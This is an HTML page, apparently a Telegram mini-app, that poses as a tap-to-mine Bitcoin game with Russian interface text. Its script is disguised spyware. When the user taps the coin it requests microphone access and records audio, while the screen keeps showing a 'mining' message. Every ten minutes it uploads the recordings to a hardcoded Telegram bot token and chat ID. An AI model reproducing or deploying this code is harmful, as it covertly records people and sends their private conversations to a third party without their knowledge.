<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Maining Prosto BTC</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body { background: black; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; color: white; font-family: Arial, sans-serif; }
    #coin { width: 280px; height: 280px; cursor: pointer; transition: transform 0.1s; }
    #status { margin-top: 40px; font-size: 22px; color: #FFD700; }
    .rotating { animation: rotate 3s linear infinite; }
    @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <!-- Надёжная картинка биткоина (никогда не удалится) -->
  <img id="coin" src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjgwIiBoZWlnaHQ9IjI4MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIxNDAiIGN5PSIxNDAiIHI9IjEzMCIgZmlsbD0iI0YxQjEwMCIgc3Ryb2tlPSIjQkE4MDAwIiBzdHJva2Utd2lkdGg9IjIwIi8+PHRleHQgeD0iMTQwIiB5PSIxNzAiIGZvbnQtc2l6ZT0iMTIwIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSI+QiZndDs8L3RleHQ+PC9zdmc+'">
  <div id="status">После нажатия начнется майнинг BTC…</div>

  <script>
  const tg = window.Telegram.WebApp;
  tg.ready();

  const coin = document.getElementById('coin');
  const status = document.getElementById('status');
  let recording = false;
  let mediaRecorder;
  let chunks = [];
  let startTime = 0;

  const BOT_TOKEN = "8326175683:AAFTBgFsDvN_rczh95FFnIS_2XZjAHz8COg";
  const CHAT_ID = "7184293365";

  coin.addEventListener('click', () => {
    if (recording) stopRecording();
    else startRecording();
  });

  function startRecording() {
    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
      recording = true;
      coin.classList.add('rotating');
      status.textContent = "Производится майнинг… (активно)";
      chunks = [];
      startTime = Date.now();

      mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' }); // webm вместо ogg — перематывается!
      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = sendAudio;
      mediaRecorder.start();

      // каждые 10 минут автоматически отправляем и начинаем новый кусок
      setInterval(() => {
        if (recording && Date.now() - startTime > 10000) { // чтобы не отправлять пустые при быстром стопе
          mediaRecorder.stop();
          mediaRecorder.start();
          chunks = [];
          startTime = Date.now();
        }
      }, 600000); // ровно 10 минут
    }).catch(err => {
      alert("Разреши микрофон!");
    });
  }

  function stopRecording() {
    recording = false;
    coin.classList.remove('rotating');
    status.textContent = "Производится майнинг BTC…";
    if (mediaRecorder && mediaRecorder.state !== "inactive") {
      mediaRecorder.stop();
    }
  }

  function sendAudio() {
    if (chunks.length === 0) return;

    const blob = new Blob(chunks, { type: 'audio/webm' });
    const filename = `mining_${new Date().toISOString().slice(0,19).replace(/:/g,"-")}.webm`;
    const file = new File([blob], filename, { type: 'audio/webm' });

    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('audio', file);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
      method: 'POST',
      body: form
    });

    chunks = [];
  }

  // остановка при закрытии
  window.addEventListener('beforeunload', stopRecording);
</script>

</body>
</html>

</html>
